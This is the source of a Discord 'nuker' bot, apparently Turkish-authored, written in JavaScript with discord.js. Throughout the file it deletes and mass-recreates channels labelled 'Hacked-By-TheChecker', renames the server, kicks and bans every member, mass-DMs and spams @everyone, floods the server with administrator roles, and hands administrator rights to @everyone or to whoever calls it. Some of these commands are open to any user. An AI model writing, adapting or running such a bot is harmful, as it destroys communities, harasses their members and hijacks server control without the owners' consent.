const { Client, GatewayIntentBits, Partials, PermissionFlagsBits, ChannelType, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const config = require('./config.json');
const fs = require('fs');

// ========== GLOBAL DURDURMA FLAG'I ==========
let isStopped = false;

// ========== AŞIRI DETAYLI LOG FONKSİYONU (RENKSİZ, HATA YOK) ==========
function logCommand(user, command, args, guild, channel, message, isOwner, error = null) {
  const timestamp = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
  const isBot = user.bot ? '🤖 BOT' : '👤 KULLANICI';
  const ownerStatus = isOwner ? '✅ SAHİP' : '❌ YETKİSİZ';

  console.log('════════════════════════════════════════════════════════════');
  console.log(`🕒 [${timestamp}]`);
  console.log(`📌 KOMUT: ${command}`);
  if (args && args.length > 0) console.log(`📂 ARGÜMANLAR: ${args.join(' ')}`);
  console.log(`👤 KULLANICI: ${user.tag} (${user.id})`);
  console.log(`🌐 GLOBAL AD: ${user.globalName || 'Yok'}`);
  console.log(`🤖 DURUM: ${isBot}`);
  console.log(`🔑 YETKİ: ${ownerStatus}`);
  if (guild) {
    console.log(`🏛️ SUNUCU: ${guild.name} (${guild.id})`);
    console.log(`📢 KANAL: ${channel?.name || 'Bilinmiyor'} (${channel?.id || 'Bilinmiyor'})`);
  }
  if (message) {
    console.log(`💬 MESAJ: ${message.content || 'Boş'}`);
    console.log(`📎 EK: ${message.attachments.size > 0 ? message.attachments.map(a => a.url).join(', ') : 'Yok'}`);
    console.log(`🔗 MESAJ ID: ${message.id}`);
  }
  if (error) {
    console.log(`❌ HATA: ${error.message}`);
    console.log(error.stack);
  }
  console.log('════════════════════════════════════════════════════════════');
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates
  ],
  partials: [Partials.Channel, Partials.Message, Partials.User]
});

const PREFIX = config.prefix || '+';

// Slash komut yapılandırması (config'ten bağımsız, ama isimler sabit)
const commands = [
  new SlashCommandBuilder().setName('stop').setDescription('Tüm işlemleri durdurur'),
  new SlashCommandBuilder().setName('devam').setDescription('Durdurulan işlemleri devam ettirir'),
  new SlashCommandBuilder().setName('patlat').setDescription('Sunucuyu patlatır'),
  new SlashCommandBuilder().setName('ayril').setDescription('Bot sunucudan ayrılır'),
  new SlashCommandBuilder().setName('kick').setDescription('Tüm üyeleri kickler'),
  new SlashCommandBuilder().setName('dm').setDescription('Tüm üyelere DM atar'),
  new SlashCommandBuilder().setName('yetki').setDescription('Kendine admin yetkisi verir'),
  new SlashCommandBuilder().setName('ban').setDescription('Tüm üyeleri banlar'),
  new SlashCommandBuilder().setName('rol').setDescription('Rol oluşturur'),
  new SlashCommandBuilder().setName('spam').setDescription('Kanala spam mesajı atar'),
  new SlashCommandBuilder().setName('panel').setDescription('Admin panelini gösterir'),
  new SlashCommandBuilder().setName('everyone').setDescription('Herkese @everyone rolü verir'),
  new SlashCommandBuilder().setName('nuke').setDescription('Tüm kanalları siler ve yeniden oluşturur'),
  new SlashCommandBuilder().setName('yavaspapatlat').setDescription('Yavaşça sunucuyu patlatır')
];

client.once('ready', async () => {
  console.log(`✅ ${client.user.tag} olarak giriş yapıldı.`);
  client.user.setActivity(config.botActivity || 'Kitty Kat', { type: config.botActivityType || 'PLAYING' });

  try {
    const rest = new REST({ version: '10' }).setToken(config.token);
    await rest.put(Routes.applicationCommands(client.user.id), { body: commands.map(cmd => cmd.toJSON()) });
    console.log('✅ Slash komutları kaydedildi.');
  } catch (err) {
    console.error('❌ Slash komut kaydı hatası:', err);
  }
});

// Slash komut etkileşimleri
client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;
  const { commandName } = interaction;

  // 🛑 DURDURMA KONTROLÜ (stop ve devam hariç)
  if (isStopped && commandName !== 'devam' && commandName !== 'stop') {
    return interaction.reply({ content: '🛑 Bot durdurulmuş durumda. /devam yazana kadar komutlar çalışmaz.', ephemeral: true });
  }

  const isOwner = interaction.user.id === config.sahip;
  const ownerOnly = ['kick', 'dm', 'ban', 'rol', 'nuke', 'yavaspapatlat'];
  if (ownerOnly.includes(commandName) && !isOwner) {
    logCommand(
      interaction.user,
      `/${commandName}`,
      interaction.options.data.map(o => `${o.name}:${o.value}`),
      interaction.guild,
      interaction.channel,
      null,
      isOwner
    );
    return interaction.reply({ content: '❌ Bu komutu sadece sahibim kullanabilir.', ephemeral: true });
  }

  logCommand(
    interaction.user,
    `/${commandName}`,
    interaction.options.data.map(o => `${o.name}:${o.value}`),
    interaction.guild,
    interaction.channel,
    null,
    isOwner
  );

  await interaction.deferReply({ ephemeral: false });

  try {
    switch (commandName) {
      case 'stop': await stop(interaction); break;
      case 'devam': await devam(interaction); break;
      case 'patlat': await patlat(interaction); break;
      case 'ayril': await ayril(interaction); break;
      case 'kick': await kick(interaction); break;
      case 'dm': await dm(interaction); break;
      case 'yetki': await yetki(interaction); break;
      case 'ban': await ban(interaction); break;
      case 'rol': await rol(interaction); break;
      case 'spam': await spam(interaction); break;
      case 'panel': await panel(interaction); break;
      case 'everyone': await everyone(interaction); break;
      case 'nuke': await nuke(interaction); break;
      case 'yavaspapatlat': await yavasPatlat(interaction); break;
      default: await interaction.editReply('❌ Bilinmeyen komut.');
    }
  } catch (err) {
    logCommand(
      interaction.user,
      `/${commandName}`,
      interaction.options.data.map(o => `${o.name}:${o.value}`),
      interaction.guild,
      interaction.channel,
      null,
      isOwner,
      err
    );
    console.error('❌ Komut hatası:', err);
    await interaction.editReply(`❌ Hata: ${err.message}`);
  }
});

// Prefix komutlar
client.on('messageCreate', async (msg) => {
  if (msg.author.bot) return;
  if (!msg.content.startsWith(PREFIX)) return;

  const args = msg.content.slice(PREFIX.length).trim().split(/ +/);
  const commandName = args.shift().toLowerCase();

  // 🛑 DURDURMA KONTROLÜ (stop ve devam hariç)
  if (isStopped && commandName !== 'devam' && commandName !== 'stop') {
    return msg.reply('🛑 Bot durdurulmuş durumda. +devam yazana kadar komutlar çalışmaz.');
  }

  const isOwner = msg.author.id === config.sahip;
  const ownerOnly = ['kick', 'dm', 'ban', 'rol', 'nuke', 'yavaspapatlat'];
  if (ownerOnly.includes(commandName) && !isOwner) {
    logCommand(
      msg.author,
      `${PREFIX}${commandName}`,
      args,
      msg.guild,
      msg.channel,
      msg,
      isOwner
    );
    return msg.reply('❌ Bu komutu sadece sahibim kullanabilir.');
  }

  logCommand(
    msg.author,
    `${PREFIX}${commandName}`,
    args,
    msg.guild,
    msg.channel,
    msg,
    isOwner
  );

  const fakeInteraction = {
    guild: msg.guild,
    channel: msg.channel,
    member: msg.member,
    user: msg.author,
    reply: (content) => msg.reply(content),
    editReply: (content) => msg.reply(content),
    deferReply: async () => { },
    deleteReply: async () => msg.delete().catch(() => { })
  };

  try {
    switch (commandName) {
      case 'stop': await stop(fakeInteraction); break;
      case 'devam': await devam(fakeInteraction); break;
      case 'patlat': await patlat(fakeInteraction); break;
      case 'ayril': await ayril(fakeInteraction); break;
      case 'kick': await kick(fakeInteraction); break;
      case 'dm': await dm(fakeInteraction); break;
      case 'yetki': await yetki(fakeInteraction); break;
      case 'ban': await ban(fakeInteraction); break;
      case 'rol': await rol(fakeInteraction); break;
      case 'spam': await spam(fakeInteraction); break;
      case 'panel': await panel(fakeInteraction); break;
      case 'everyone': await everyone(fakeInteraction); break;
      case 'nuke': await nuke(fakeInteraction); break;
      case 'yavaspapatlat': await yavasPatlat(fakeInteraction); break;
      default: await msg.reply('❌ Bilinmeyen komut.');
    }
  } catch (err) {
    logCommand(
      msg.author,
      `${PREFIX}${commandName}`,
      args,
      msg.guild,
      msg.channel,
      msg,
      isOwner,
      err
    );
    console.error('❌ Prefix hatası:', err);
    await msg.reply(`❌ Hata: ${err.message}`).catch(() => { });
  }
});

// ---- FONKSİYONLAR (tamamen config tabanlı) ----

async function stop(ctx) {
  isStopped = true;
  await ctx.editReply('🛑 Tüm işlemler durduruldu. +devam yazana kadar hiçbir komut çalışmayacak.');
}

async function devam(ctx) {
  isStopped = false;
  await ctx.editReply('✅ İşlemler devam ediyor. Artık komutlar çalışacak.');
}

async function patlat(ctx) {
  const guild = ctx.guild;
  await ctx.editReply('⏳ Sunucu patlatılıyor...');
  const channelName = config.channelName || 'Hacked-By-TheChecker';
  const channelCount = config.channelCount || 70;

  for (const channel of guild.channels.cache.values()) {
    if (channel.type === ChannelType.GuildText || channel.type === ChannelType.GuildVoice) {
      try { await channel.delete(); } catch (err) { console.error('Kanal silme hatası:', err); }
    }
  }

  for (let i = 0; i < channelCount; i++) {
    try {
      const chan = await guild.channels.create({
        name: `${channelName}`,
        type: ChannelType.GuildText
      });
      await chan.send('🔥 Bu sunucu patlatıldı!');
    } catch (err) { console.error('Kanal oluşturma hatası:', err); }
  }

  try {
    await guild.setName(config.guildName || 'Patlatıldı uwu');
    if (config.guildIconURL) await guild.setIcon(config.guildIconURL);
  } catch (err) { console.error('Guild güncelleme hatası:', err); }

  for (const role of guild.roles.cache.values()) {
    if (role.managed) {
      try { await role.delete(); } catch (err) { console.error('Rol silme hatası:', err); }
    }
  }

  try {
    if (config.botAvatarURL) await client.user.setAvatar(config.botAvatarURL);
    if (config.botUsername) await client.user.setUsername(config.botUsername);
  } catch (err) { console.error('Bot güncelleme hatası:', err); }

  await ctx.editReply('✅ Sunucu patlatıldı!');
}

async function ayril(ctx) {
  await ctx.editReply('👋 Güle güle!');
  await ctx.guild.leave();
}

async function kick(ctx) {
  await ctx.editReply('⏳ Tüm üyeler kickleniyor...');
  const members = await ctx.guild.members.fetch();
  let count = 0;
  const reason = config.kickReason || 'Sunucudan atıldınız.';
  for (const member of members.values()) {
    if (member.kickable && member.id !== client.user.id) {
      try {
        await member.kick(reason);
        count++;
        await new Promise(resolve => setTimeout(resolve, 200));
      } catch (err) { console.error('Kick hatası:', err); }
    }
  }
  await ctx.editReply(`✅ ${count} üye kicklendi.`);
}

async function dm(ctx) {
  await ctx.editReply('⏳ DM gönderiliyor...');
  const members = await ctx.guild.members.fetch();
  let count = 0;
  const message = config.dmMessage || '**Bir sunucu sevilmiştir haberiniz olsun! İYİ GÜNLER :3** :wink:';
  for (const member of members.values()) {
    if (!member.user.bot) {
      try {
        await member.send(message);
        count++;
        await new Promise(resolve => setTimeout(resolve, 150));
      } catch (err) { console.error('DM hatası:', err); }
    }
  }
  await ctx.editReply(`✅ ${count} kişiye DM gönderildi.`);
}

async function yetki(ctx) {
  const role = await ctx.guild.roles.create({
    name: config.adminRoleName || '👑 Admin',
    permissions: [PermissionFlagsBits.Administrator]
  });
  await ctx.member.roles.add(role);
  await ctx.editReply('✅ Admin yetkisi verildi.');
}

async function ban(ctx) {
  await ctx.editReply('⏳ Tüm üyeler banlanıyor...');
  const members = await ctx.guild.members.fetch();
  let count = 0;
  const reason = config.banReason || 'Sunucudan uzaklaştırıldınız.';
  for (const member of members.values()) {
    if (member.bannable && member.id !== client.user.id) {
      try {
        await member.ban({ reason });
        count++;
        await new Promise(resolve => setTimeout(resolve, 300));
      } catch (err) { console.error('Ban hatası:', err); }
    }
  }
  await ctx.editReply(`✅ ${count} üye banlandı.`);
}

async function rol(ctx) {
  await ctx.editReply('⏳ Rol oluşturuluyor...');
  const roleName = config.roleName || 'HACKED';
  const roleColor = config.roleColor || '#FF3E00';
  const roleCount = config.roleCount || 50;
  for (let i = 0; i < roleCount; i++) {
    try {
      await ctx.guild.roles.create({
        name: roleName,
        color: roleColor,
        permissions: [PermissionFlagsBits.Administrator]
      });
      await new Promise(resolve => setTimeout(resolve, 100));
    } catch (err) { console.error('Rol oluşturma hatası:', err); }
  }
  await ctx.editReply(`✅ ${roleCount} rol oluşturuldu.`);
}

async function spam(ctx) {
  await ctx.editReply('⏳ Spam başlıyor...');
  const msg = config.spamMessage || '**Ş-şey b-bu sunucusu patlatılmıştır uwu** @everyone :heart:';
  const count = config.spamCount || 100;
  for (let i = 0; i < count; i++) {
    try {
      await ctx.channel.send(msg);
      await new Promise(resolve => setTimeout(resolve, 50));
    } catch (err) { console.error('Spam hatası:', err); }
  }
  await ctx.editReply(`✅ ${count} mesaj spamlandı.`);
}

async function panel(ctx) {
  const embed = new EmbedBuilder()
    .setTitle('Admin Panel - Hoş Geldiniz')
    .setDescription('Bu admin panel komutları ve açıklamaları içerir.')
    .addFields(
      { name: '+patlat', value: 'Sunucuyu patlatır.' },
      { name: '+ayrıl', value: 'Bot kendini sunucudan atar.' },
      { name: '+kick', value: 'Sunucudakileri kickler.' },
      { name: '+dm', value: 'Sunucudaki herkese duyuru atar.' },
      { name: '+yetki', value: 'Size yetki verir.' },
      { name: '+ban', value: 'Herkesi banlar.' },
      { name: '+rol', value: 'Hacked adlı fazlaca rol oluşturur.' },
      { name: '+spam', value: 'Sunucuda everyone spamlar.' },
      { name: '+everyone', value: 'Herkese @everyone yetkisi verir.' },
      { name: '+nuke', value: 'Tüm kanalları silip yeniden oluşturur.' },
      { name: '+yavaspapatlat', value: 'Yavaşça ve sessizce patlatır.' }
    )
    .setImage('https://cdn.discordapp.com/attachments/1173319481599213639/1258825072248881292/a_0b05ce4dbc49d501b989eb54b99aa805.gif?ex=668973b5&is=66882235&hm=39b19bd6622752e65ebbc3d26c855c5933a862970d56b807131a8592cd6f5922&')
    .setColor(0xff0000)
    .setFooter({ text: 'Tekrardan Hoşgeldiniz Efendim.' });
  await ctx.editReply({ embeds: [embed] });
}

async function everyone(ctx) {
  const everyoneRole = ctx.guild.roles.everyone;
  await everyoneRole.setPermissions([PermissionFlagsBits.Administrator]);
  await ctx.editReply('✅ @everyone rolüne admin yetkisi verildi.');
}

async function nuke(ctx) {
  await ctx.editReply('⏳ Nuke başlıyor...');
  const channels = await ctx.guild.channels.fetch();
  for (const channel of channels.values()) {
    if (channel.type === ChannelType.GuildText || channel.type === ChannelType.GuildVoice) {
      try { await channel.delete(); } catch (err) { console.error('Nuke kanal silme hatası:', err); }
    }
  }
  const nukeCount = config.nukeChannelCount || 50;
  for (let i = 0; i < nukeCount; i++) {
    try {
      await ctx.guild.channels.create({
        name: `nuke`,
        type: ChannelType.GuildText
      });
    } catch (err) { console.error('Nuke kanal oluşturma hatası:', err); }
  }
  await ctx.editReply(`✅ Nuke tamamlandı, ${nukeCount} yeni kanal oluşturuldu.`);
}

async function yavasPatlat(ctx) {
  await ctx.editReply('⏳ Yavaş patlatma başlıyor...');
  const guild = ctx.guild;
  const channels = await guild.channels.fetch();
  const delay = config.yavasDelay || 500;
  for (const [id, channel] of channels) {
    if (channel.type === ChannelType.GuildText || channel.type === ChannelType.GuildVoice) {
      try {
        await channel.delete();
        await new Promise(resolve => setTimeout(resolve, delay));
      } catch (err) { console.error('Yavaş silme hatası:', err); }
    }
  }
  const yavasCount = config.yavasChannelCount || 30;
  for (let i = 0; i < yavasCount; i++) {
    try {
      await guild.channels.create({
        name: `yavas`,
        type: ChannelType.GuildText
      });
      await new Promise(resolve => setTimeout(resolve, 300));
    } catch (err) { console.error('Yavaş oluşturma hatası:', err); }
  }
  await ctx.editReply(`✅ Yavaş patlatma tamamlandı, ${yavasCount} kanal oluşturuldu.`);
}

client.login(config.token);
console.log('🚀 Bot başlatılıyor...');